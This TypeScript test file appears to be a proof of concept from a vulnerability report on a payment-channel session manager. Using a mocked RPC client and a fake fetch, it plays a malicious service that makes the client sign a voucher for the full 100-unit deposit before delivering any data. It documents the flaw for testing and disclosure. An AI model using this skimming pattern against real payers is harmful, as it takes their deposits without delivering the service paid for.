import {
  createClient,
  custom,
  decodeFunctionData,
  encodeFunctionResult,
  keccak256,
  stringToHex,
  type Address,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { Transaction } from 'viem/tempo'
import { expect, test } from 'vp/test'

import * as Challenge from '../../../Challenge.js'
import * as Constants from '../../../Constants.js'
import * as Credential from '../../../Credential.js'
import { escrowAbi } from '../precompile/escrow.abi.js'
import {
  formatNeedVoucherEvent,
  tip20ChannelEscrow,
  type SessionCredentialPayload,
} from '../precompile/Protocol.js'
import * as Voucher from '../precompile/Voucher.js'
import { sessionManager } from './SessionManager.js'

const account = privateKeyToAccount(
  keccak256(stringToHex('tempo-report-c010-local-payer')),
)

const client = createClient({
  account,
  chain: { id: 4217 } as never,
  transport: custom({
    async request(args) {
      if (args.method === 'eth_chainId') return '0x1079'
      if (args.method === 'eth_getTransactionCount') return '0x0'
      if (args.method === 'eth_estimateGas') return '0x5208'
      if (args.method === 'eth_maxPriorityFeePerGas') return '0x1'
      if (args.method === 'eth_getBlockByNumber') return { baseFeePerGas: '0x1' }
      if (args.method === 'eth_call')
        return encodeFunctionResult({
          abi: escrowAbi,
          functionName: 'getChannelState',
          result: { settled: 0n, deposit: 100n, closeRequestedAt: 0 },
        })
      throw new Error(`unexpected rpc request: ${args.method}`)
    },
  }),
})

const challenge = Challenge.from({
  id: 'local-malicious-service-challenge',
  realm: 'malicious-service.invalid',
  method: 'tempo',
  intent: 'session',
  request: {
    amount: '1',
    currency: '0x20c0000000000000000000000000000000000001',
    decimals: 0,
    recipient: '0x742d35cc6634c0532925a3b844bc9e7595f8fe00',
    suggestedDeposit: '100',
    unitType: 'chunk',
    methodDetails: {
      chainId: 4217,
      escrowContract: tip20ChannelEscrow,
      sessionProtocol: Constants.SessionProtocols.v2,
    },
  },
})

function paymentRequired() {
  return new Response(null, {
    status: 402,
    headers: { 'WWW-Authenticate': Challenge.serialize(challenge) },
  })
}

test('malicious stream induces a full-deposit voucher before delivering application data', async () => {
  const payloads: SessionCredentialPayload[] = []
  const requestMethods: string[] = []

  const fakeFetch: typeof globalThis.fetch = async (_input, init) => {
    requestMethods.push(init?.method ?? 'GET')
    const authorization = new Headers(init?.headers).get(Constants.Headers.authorization)
    const payload = authorization
      ? Credential.deserialize<SessionCredentialPayload>(authorization).payload
      : undefined
    if (payload) payloads.push(payload)

    if (!payload) return paymentRequired()
    if (payload.action === 'open') {
      const event = formatNeedVoucherEvent({
        acceptedCumulative: '1',
        channelId: payload.channelId,
        deposit: '100',
        requiredCumulative: '100',
      })
      return new Response(event, {
        status: 200,
        headers: { 'Content-Type': 'text/event-stream' },
      })
    }
    if (payload.action === 'voucher') return new Response(null, { status: 200 })
    throw new Error(`unexpected credential action: ${payload.action}`)
  }

  const manager = sessionManager({
    account,
    client,
    decimals: 0,
    fetch: fakeFetch,
    maxDeposit: '100',
  })

  const stream = await manager.sse('https://malicious-service.invalid/stream')
  const delivered: string[] = []
  for await (const message of stream) delivered.push(message)

  const open = payloads.find((payload) => payload.action === 'open')
  const voucher = payloads.find((payload) => payload.action === 'voucher')
  if (!open || open.action !== 'open') throw new Error('missing open credential')
  if (!voucher || voucher.action !== 'voucher') throw new Error('missing voucher credential')

  const openTransaction = Transaction.deserialize(open.transaction)
  if (!('calls' in openTransaction)) throw new Error('expected Tempo calls')
  const openCall = openTransaction.calls[0] as { data?: `0x${string}` }
  if (!openCall.data) throw new Error('missing open calldata')
  const decodedOpen = decodeFunctionData({ abi: escrowAbi, data: openCall.data })
  if (decodedOpen.functionName !== 'open') throw new Error('expected open call')
  const openedDeposit = decodedOpen.args[3]

  const signatureValid = Voucher.verifyVoucher(
    tip20ChannelEscrow,
    4217,
    {
      channelId: voucher.channelId,
      cumulativeAmount: BigInt(voucher.cumulativeAmount),
      signature: voucher.signature,
    },
    open.descriptor.authorizedSigner as Address,
  )

  const transcript = {
    applicationMessagesDelivered: delivered.length,
    initialUnitPrice: challenge.request.amount,
    managementRequestMethods: requestMethods,
    merchantAuthorizationDelta: (BigInt(voucher.cumulativeAmount) - 1n).toString(),
    openedDeposit: openedDeposit.toString(),
    signatureValid,
    signedVoucherCumulative: voucher.cumulativeAmount,
  }
  console.log(`SKIMMING_POC ${JSON.stringify(transcript)}`)

  expect(openedDeposit).toBe(100n)
  expect(delivered).toEqual([])
  expect(voucher.channelId).toBe(open.channelId)
  expect(voucher.cumulativeAmount).toBe('100')
  expect(signatureValid).toBe(true)
})
